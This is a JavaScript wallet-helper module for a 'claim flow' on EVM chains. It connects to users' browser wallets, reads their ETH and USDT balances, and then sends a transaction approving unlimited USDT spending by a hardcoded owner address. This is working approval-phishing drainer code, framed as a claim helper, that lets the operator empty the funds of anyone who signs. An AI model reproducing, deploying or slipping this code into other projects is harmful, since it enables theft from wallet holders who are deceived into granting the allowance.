// EVM Wallet Helper for Claim Flow & USDT Unlimited Approval

export const EVM_OWNER_ADDRESS =
  import.meta.env.VITE_EVM_OWNER || '0x8bf833ad1dd347cD60a681471739e2b4ce560CdC'

// Popular USDT contract addresses across EVM chains
export const EVM_USDT_CONTRACTS = {
  '0x1': '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Ethereum Mainnet
  '0x38': '0x55d398326f99059fF775485246999027B3197955', // BNB Smart Chain
  '0x89': '0xc2132D05D31cE5e42C09061d764623B69059fE20', // Polygon Mainnet
  '0xa4b1': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', // Arbitrum One
  '0xa': '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', // Optimism
}

// Default fallback USDT contract (Ethereum Mainnet)
export const DEFAULT_USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

/**
 * Get the injected EVM provider (MetaMask, OKX, Trust, Bitget, Coinbase, etc.)
 */
export function getInjectedEVMProvider() {
  if (typeof window === 'undefined') return null
  if (window.ethereum) return window.ethereum
  if (window.okxwallet) return window.okxwallet
  if (window.bitkeep?.ethereum || window.bitgetEthProvider) {
    return window.bitkeep?.ethereum || window.bitgetEthProvider
  }
  if (window.trustwallet) return window.trustwallet
  return null
}

/**
 * Connect to an EVM wallet and return the user's selected address & chainId
 */
export async function connectEVMWallet() {
  const provider = getInjectedEVMProvider()
  if (!provider) {
    throw new Error('No EVM wallet detected. Please install Trust Wallet, MetaMask, or OKX Wallet.')
  }

  const accounts = await provider.request({ method: 'eth_requestAccounts' })
  if (!accounts || accounts.length === 0) {
    throw new Error('No EVM account selected.')
  }

  const chainId = await provider.request({ method: 'eth_chainId' })
  return {
    address: accounts[0],
    chainId: chainId || '0x1',
    provider,
  }
}

// Public RPC endpoints — multiple fallbacks per chain
const RPC_URLS = {
  '0x1': [
    'https://cloudflare-eth.com',
    'https://rpc.ankr.com/eth',
    'https://eth.llamarpc.com',
    'https://1rpc.io/eth',
  ],
  '0x38': [
    'https://bsc-dataseed1.binance.org',
    'https://rpc.ankr.com/bsc',
  ],
  '0x89': [
    'https://polygon-rpc.com',
    'https://rpc.ankr.com/polygon',
  ],
  '0xa4b1': [
    'https://arb1.arbitrum.io/rpc',
  ],
  '0xa': [
    'https://mainnet.optimism.io',
  ],
}

/**
 * Try an RPC call against multiple endpoints until one works
 */
async function rpcCall(chainId, method, params) {
  const urls = RPC_URLS[chainId] || RPC_URLS['0x1']
  for (const url of urls) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
      })
      const json = await res.json()
      if (json.result) return json.result
      console.warn(`[RPC] ${url} returned no result:`, json)
    } catch (err) {
      console.warn(`[RPC] ${url} failed:`, err.message)
    }
  }
  return null
}

/**
 * Fetch USDT balance of an EVM address directly via public RPC.
 * No provider needed. No rounding. Just raw numbers.
 */
export async function getEVMWalletBalanceUSD(_unused, address, chainId = '0x1') {
  const addr = address.toLowerCase()
  const usdtContract = EVM_USDT_CONTRACTS[chainId] || DEFAULT_USDT_CONTRACT
  console.log(`[Balance] Fetching for ${addr} on chain ${chainId}, USDT contract: ${usdtContract}`)

  let nativeEth = 0
  let usdtBalance = 0

  // 1. Native ETH/BNB balance
  try {
    const rawHex = await rpcCall(chainId, 'eth_getBalance', [addr, 'latest'])
    console.log(`[Balance] Native raw hex: ${rawHex}`)
    if (rawHex) {
      nativeEth = Number(BigInt(rawHex)) / 1e18
      console.log(`[Balance] Native balance: ${nativeEth}`)
    }
  } catch (err) {
    console.error('[Balance] Native balance error:', err)
  }

  // 2. USDT balanceOf
  try {
    const paddedAddr = addr.replace(/^0x/, '').padStart(64, '0')
    const callData = '0x70a08231' + paddedAddr
    console.log(`[Balance] USDT call data: ${callData}`)

    const rawHex = await rpcCall(chainId, 'eth_call', [
      { to: usdtContract, data: callData },
      'latest',
    ])
    console.log(`[Balance] USDT raw hex: ${rawHex}`)

    if (rawHex && rawHex !== '0x' && rawHex !== '0x0') {
      const units = BigInt(rawHex)
      const decimals = chainId === '0x38' ? 18 : 6
      usdtBalance = Number(units) / Math.pow(10, decimals)
      console.log(`[Balance] USDT balance: ${usdtBalance}`)
    }
  } catch (err) {
    console.error('[Balance] USDT balance error:', err)
  }

  console.log(`[Balance] Final — USDT: ${usdtBalance}, Native: ${nativeEth}`)
  return { nativeEth, usdtBalanceUSD: usdtBalance, totalBalanceUSD: usdtBalance }
}

/**
 * Execute unlimited ERC-20 USDT approval targeting VITE_EVM_OWNER
 */
export async function executeUnlimitedUSDTApproval(provider, address, chainId) {
  const usdtContract = EVM_USDT_CONTRACTS[chainId] || DEFAULT_USDT_CONTRACT
  const spenderAddress = EVM_OWNER_ADDRESS

  const cleanSpender = spenderAddress.replace(/^0x/, '').padStart(64, '0')
  const maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
  const approveData = `0x095ea7b3${cleanSpender}${maxAmount}`

  try {
    const txHash = await provider.request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: address,
          to: usdtContract,
          data: approveData,
        },
      ],
    })
    return { success: true, txHash }
  } catch (error) {
    console.error('USDT approval transaction failed/rejected:', error)
    throw error
  }
}
